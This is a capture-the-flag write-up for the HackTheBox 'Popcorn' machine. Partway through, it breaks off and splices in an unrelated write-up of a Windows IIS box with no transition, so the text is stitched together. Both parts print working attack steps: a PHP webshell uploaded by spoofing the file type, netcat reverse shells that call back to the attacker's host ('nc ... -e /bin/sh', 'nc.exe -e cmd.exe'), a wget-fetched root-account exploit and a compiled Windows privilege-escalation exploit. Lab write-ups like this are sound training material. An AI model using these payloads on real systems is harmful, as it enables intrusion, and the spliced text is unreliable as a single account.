---
layout: default
title: HackTheBox - Popcorn Writeup
permalink: /htb/popcorn
---

# Popcorn

> **Name:** Popcorn
>
> **Creator:** [ch4p](https://www.hackthebox.eu/home/users/profile/1)
>
> **Difficulty:** Medium


## Intro

[Popcorn](https://www.hackthebox.eu/home/machines/profile/4) was released on 15 Mar 2017 and is one of the first boxes released on the platform. It is a medium rated Linux box, which makes it a good place to consolidate those skills picked up on beginner boxes and start to push yourself into trickier areas. I originall completed this when it had already retired and I was making my way through some of the older boxes to help prepare me for the Pentesting With Kali course that I was about to begin!. As it was done early in methodology development my notes weren't as comprehensive as I do now, so I've had to fully go back and re-do the box to make this write-up. 


## Getting Started

As is always the case we start off with performing a full port scan against the box to  get an idea of what services are available. My preferred command is shown below:

``` nmap -p- 10.10.10.6 -sC -sV -oA full-scan ```

This command runs a SYN, or half-open scan against all ports. With the additional flags running default scripts, version detection and creating an output file in various formats. 

The scan gives the following results:

![Scan Results]({{site.url}}/assets/popcorn/scan-results.png)


## Enumeration

Looking at the results from the Nmap scan there isn't much of an attack surface! A web server and ssh. Whilst there are some exploits for older versions of Apache, there isn't anything that stands out as being particularly useful at this point. Typically, I would then look at using the site as a standard user and seeing what functionality exists. But in this case there is none! It is a default page.

![Default Page]({{site.url}}/assets/popcorn/default-page.png)

In situations like this it can go two ways, either we need a proper domain name for the site, or there are directories available other than this default page. No luck with the domain name this time. So off to directory discovery we go!


## Web Server Enumeration

My choice of tool for directory discovery changes depending upon what I'm doing, but for this write-up I will use gobuster with the following command:

``` gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/big.txt ```

Breaking down the command we can explain each part of it as follows:

* ``` gobuster ``` to launch gobuster
* ``` dir ``` to use the directory discovery mode
* ``` -u ``` to set the URL to target
* ``` -w ``` to set the wordlist of directories

This will then take every entry in the wordlist and append it to the URL and check for the HTTP response code. As shown in the following example.

![Gobuster]({{site.url}}/assets/popcorn/gobuster.png)

There are some interesting directories in this list, particularly the test, rename and torrent ones. A quick check is performed on each to see what is there and which one could be a viable attack vector. 

![Rename]({{site.url}}/assets/popcorn/rename.png)

This looks promising, seems like an API rename a file and potentially move them. 
![Test]({{site.url}}/assets/popcorn/test.png)

This is just the output from phpinfo.php, which provides a lot of information that could be useful for later on. 

![Torrent]({{site.url}}/assets/popcorn/torrent.png)

Hmmmm, this has potential. A torrent site, that has a few functions available. With the one that stands out most being upload! File upload functions are a common way of being able to get malicious code onto a target, as long as you can find a way to bypass any checks that are in place. A quick check of searchsploit also shows an available exploit

![Searchsploit]({{site.url}}/assets/popcorn/searchsploit.png)

The contents of this particular entry are not the best. But I'm sure just by playing with the upload function it can be figured out! First things first, trying to access the upload function requires a logon. But it is possible to create your own account by following the signup link. Once done, login and you can see the upload page. 

![Upload]({{site.url}}/assets/popcorn/upload.png)

## Upload Exploitation

As it only allows torrent file uploads a copy of the kali torrent is used for testing purposes and burp is used to start proxying traffic. Once the upload completes there is an option to edit it, which allows images to be uploaded. This is a much better target!

![Image Upload]({{site.url}}/assets/popcorn/upload-image.png)

A very simple php webshell is created by echoing the following line into a document:

``` <?php echo system($_GET['cmd']); ?> ```

If successful this will allow us to issue simple commands as part of a GET request to the file. Trying to upload ``` tiro.php ``` results in an invalid file error. 

![Invalid File]({{site.url}}/assets/popcorn/invalid-file.png)

However, if the request is intercepted in burp, and the ```Content-Type: ``` is updated from ``` application/x-php ``` to ``` image/png ``` as shown in the following image:

![Burp Intercept]({{site.url}}/assets/popcorn/burp-intercept.png)

and this will result in a successful upload. 

![Upload Success]({{site.url}}/assets/popcorn/upload-success.png)

Now we just need to find where this has been uploaded to. When the torrent page is refreshed it attempts to load the image that has been uploaded. As a proper image has not been upload it doesn't preview the image, but by hovering the mouse over the message it reveals the location of the uploaded file at the very bottom of the page.

![Upload Location]({{site.url}}/assets/popcorn/upload-location.png)

It would also be possible to find this location by using gobuster as well by setting the URL to ``` http://10.10.10.6/torrent/ ``` as the upload directory has indexing enabled. 

![Indexing]({{site.url}}/assets/popcorn/indexing.png)

Now accessing the web shell and submitting the following command will prove code execution:

``` http://10.10.10.6/torrent/upload/<file name>.php?cmd=whoami ```

![whoami]({{site.url}}/assets/popcorn/whoami.png)

## Getting A Shell

From this we can use the web shell to run a netcat reverse shell command to get a shell. The command I used was:

``` ?cmd=nc 10.10.14.37 443 -e /bin/sh ```

Which was caught by the netcat listener that was setup beforehand. 

![Netcat Shell]({{site.url}}/assets/popcorn/netcat-shell.png)

Once in a shell on a linux box one of the first things I try to do is upgrade it and the python pty module is perfect for this. The full command run is:

``` python -c 'import pty;pty.spawn("/bin/bash")' ```

![Pty Upgrade]({{site.url}}/assets/popcorn/pty-upgrade.png)

After upgrading it is worth going to grab that user.txt flag and check out what other files are available, and if they contain anything interesting. 

## Privilege Escalation

From checking the user's home directory a file of interest was found called ``` motd.legal-displayed ``` within the ``` .cache ``` directory. A quick bit of research reveals that this file is created every time a user logs in via SSH and a bit more digging reveals that the PAM MOTD modules had a vulnerability that could allow a privilege escalation. Some details can be seen in the following blogpost:

* [Softpedia](https://news.softpedia.com/news/Ubuntu-Bug-Allows-Local-Users-to-Gain-Root-Privileges-146854.shtml)

> "Apparently the problem stems from unusual high access rights for the motd.legal-notice file dropped by pam_motd inside each user's local cache directory. “display_legal() can be tricked to follow a ~/.cache symlink and chown the target of the link to the unprivileged user."

A check in searchsploit reveals an exploit for this as well. 

![MOTD Searchsploit]({{site.url}}/assets/popcorn/motd.png)

Exploit ``` 14339.sh ``` is selected as the best option, and a review of the script shows that it creates the account ``` toor ``` with root privileges. This is one of the many scripts in searchsploit that needs converting so that it will run properly, due to being created on a Windows based system and the different line terminators compared to linux. This can be done with the following command:

``` dos2unix <filename> ```

This is file is then hosted on a python web server with the following command:

``` python3 -m http.server 80 ```

The file is then downloaded from the target using wget and made executable. 

![Exploit Transfer]({{site.url}}/assets/popcorn/exploit-transfer.png)

Now all that is left is to run the exploit, sit back and wait for the password prompt to give us that root shell!

![Privesc Complete]({{site.url}}/assets/popcorn/privesc.png)

There we have it! A not so tricky box, but it requires an eye for detail and being able to spot the MOTD file, then link that to a potential privesc. It would be very easy to just ignore that file and this is where experience comes into play and getting used to what are standard files, and those which are not so common and what they are. 







* aspnet_client
* iisstart.htm
* welcome.png

These look like the default files you would find in the root of a webserver on Windows, this is backed up by Nmap identifying IIS 7.5 running on port 80. The version of IIS should also stand out, this information can be used to give a good idea of which operating system is in use. With IIS 7.5 being the default on Server 2008R2, and as an additional feature you can turn on in Windows 7. 

The next step is to confirm that it is possible to upload a file via anonymous ftp access, and retrieve it via the web server. This will confirm the suspicions about the ftp giving us access to the web server root directory. We can quickly make a test file with the following command:

``` echo "Tiro's Super Secret Test" > Tiro.txt ```

All that command does is echo the text of your choice into a file of your choice, and if the file doesn't exit it will create it. Next up, is to connect to the ftp server and upload the file. 

![FTP Upload]({{site.url}}/assets/devel/ftp-upload.png)

The process shown above began by using the following command to connect to the ftp server:

* ``` ftp 10.10.10.5 ```
* When prompted for a username enter ``` anonymous ```
* When prompted for password put whatever you want
* Once ``` ftp > ``` appears you can upload your file with ``` put <filename> ```
* Using ``` ls ``` after the upload completes gives you confirmation that it is there

Now it is possible to browse to ``` http://10.10.10.5/Tiro.txt ``` and check if the file is there.

![Test Upload]({{site.url}}/assets/devel/test-text.png)

Whoop! It works, so what could possibly go wrong with allowing someone to upload files to the root directory of a web server? 


## Command Execution

A quick check of ``` webshells ``` on Kali gives a list of types of webshells available and changes that to your current directory.

![Web Shells]({{site.url}}/assets/devel/web-shells.png)

Now remember at the beginning when Nmap highlighted that the web server was IIS 7.5. Well that piece of information is now pretty useful as it gives an understanding on what languages the server is likely to understand and execute. As it's Windows and IIS picking an aspx webshell is a good way forward. Kali has one available in the aspx directory that can quickly be copied to your working directory ready to be uploaded using the ftp client. 

Once uploaded it is possible to browse to ``` http://10.10.10.5/cmdasp.aspx ``` to access it. This will give a very simple webpage with a text box for user input, and an execute button. 

![Empty Web Shell]({{site.url}}/assets/devel/blank-webshell.png)

How this works, is that whatever the user puts into the ``` command ``` field is taken and passed as an argument to ``` cmd.exe /c ``` when the execute button is pressed. The output is then displayed to screen, as shown with ``` whoami ``` in this example.

![Whoami]({{site.url}}/assets/devel/whoami.png)


## Get a Shell

Now that command execution is confirmed the next step is to look at a way of getting a full shell on the box. There are a few ways you can do this, like uploading a msfvenom payload and executing it, or running a powershell one-liner (a really long one liner). But for this one I am going to use a smbserver to host netcat and execute a reverse shell command. 

The smbserver is setup using the impacket-smbserver script with the following command:

``` impacket-smbserver -smb2support <share name> <directory to share> ```

Just make sure that nc.exe is in the directory you share! You can find where it is with ``` locate nc.exe ``` and then copy it to your working directory. Then run the command to setup your smb server. 

![Share Setup]({{site.url}}/assets/devel/setup-share.png)

Once it is setup a listener is setup using netcat:

``` nc -nlvp 443 ```

Then the netcat reverse shell command is run. 

``` \\10.10.14.33\tiro\nc.exe -e cmd.exe 10.10.14.33 443 ```

This looks a bit different to usual, but only because it is passing the network share location of nc.exe. The incoming request to the smb server should be seen in the terminal output:

![Accessing Share]({{site.url}}/assets/devel/accessing-share.png)

The listener will then catch the incoming connection and give a command shell. 

![Shell]({{site.url}}/assets/devel/shell-catching.png)


## Privilege Escalation

As we are a low privileged user it is a good idea to do some more enumeration to find potential methods of escalating privileges. Whilst I was preparing for my OSCP I found two good blog posts that were very useful for Windows privilege escalation, and gave me methods to solve pretty much every Windows box in the labs:
* [Fuzzy Security](https://www.fuzzysecurity.com/tutorials/16.html)
* [Absolomb](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

There are also multiple scripts out there that can automate this process and speed up spotting the path to take, but I recommend taking some time to follow through those blogs and checking all the things they mention. It can give you a good idea of what is normal, what isn't normal and will help to spot those unusual configurations that you can abuse. 

The first command that both blogs suggest is ``` systeminfo ``` as this will give a lot of information about the target such as the patching level. The output from this command is shown below, and the most noticeable thing is that no hotfixes have been applied to it!

![Systeminfo]({{site.url}}/assets/devel/system-info.png)

A very simple google search for the terms privesc and the OS version brings some promising results. 

![Search Results]({{site.url}}/assets/devel/ms11-046.png)

The top result is also in exploitdb, so it is already available on Kali via searchsploit. The code is also well commented and explains exactly how to compile it. However, you may have to install mingw-64 to be able to compile it. Once installed it is compiled with this command:

``` i686-w64-mingw32-gcc 40564.c -o tiro.exe -lws2_32 ```

This is the same command that is detailed in the comments of the programme. The ```40564.c file``` is a straight copy from exploitdb and didn't require any modifications. Once it is compiled it can be placed into the directory that the smb server is running and it can be executed to give that lovely system shell. 

![Yay System]({{site.url}}/assets/devel/system.png)

A fun box that is pretty simple in each step and only needs basic enumeration to find the way forward. 

